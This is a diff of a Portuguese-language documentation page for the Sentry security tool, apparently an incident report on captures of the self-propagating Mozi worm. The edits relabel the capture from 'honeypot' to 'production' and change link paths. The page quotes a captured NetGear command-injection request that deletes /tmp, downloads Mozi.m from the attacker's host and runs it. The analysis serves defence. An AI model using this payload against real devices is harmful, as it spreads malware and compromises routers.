@@ -3,20 +3,20 @@ title: "Propagação do worm Mozi"
 description: "Segunda e terceira capturas do worm Mozi, com o payload apontando para o próprio IP do atacante; 88/100 crítico, bloqueado, IP banido por 24h"
 ---
 
-# Relato de incidente — autopropagação do worm Mozi (captura honeypot)
+# Relato de incidente — autopropagação do worm Mozi (captura de produção)
 
 > **Fonte original:**
 > [`incident-report-mozi-propagation.md`](https://github.com/IDjinn/sentry/blob/main/examples/incident-report-mozi-propagation.md)
 > no repositório.
 
-Par de [Mozi: tentativa de RCE](./mozi-rce). Segunda e terceira aparições
-do mesmo payload de worm contra um deployment honeypot de produção do
+Par de [Mozi: tentativa de RCE](/pt/docs/examples/mozi-rce). Segunda e terceira aparições
+do mesmo payload de worm contra um deployment de produção do
 Sentry; os IPs dos atacantes estão parcialmente mascarados.
 
 ## TL;DR
 
 Três dias após a primeira captura de Mozi, o mesmo worm de injeção de
-comando NetGear atingiu o honeypot novamente a partir de outro host
+comando NetGear atingiu o alvo novamente a partir de outro host
 infectado — desta vez com a URL de download do payload apontando para o
 **próprio endereço IP do atacante**, a impressão digital de um worm em
 autopropagação ativa. Mesmo resultado de antes: **88/100 crítico, bloqueado
@@ -41,13 +41,13 @@ primeiro e fala HTTP depois, e ambas as camadas de telemetria o capturaram.
 
 ## O payload
 
-```
+```http
 GET /setup.cgi?next_file=netgear.cfg&todo=syscmd
     &cmd=rm -rf /tmp/*;wget http://153.117.66.xxx:33581/Mozi.m -O /tmp/netgear;sh netgear
     &curpath=/&currentsetting.htm=1
 ```
 
-Compare com a primeira captura ([Mozi: tentativa de RCE](./mozi-rce)), em
+Compare com a primeira captura ([Mozi: tentativa de RCE](/pt/docs/examples/mozi-rce)), em
 que a URL de download apontava para `192.168.1.1:8088` — o gateway do
 próprio roteador infectado. Aqui a URL embute o **IP público do atacante em
 uma porta alta** (`:33581`), ou seja: este nó roda seu próprio servidor de
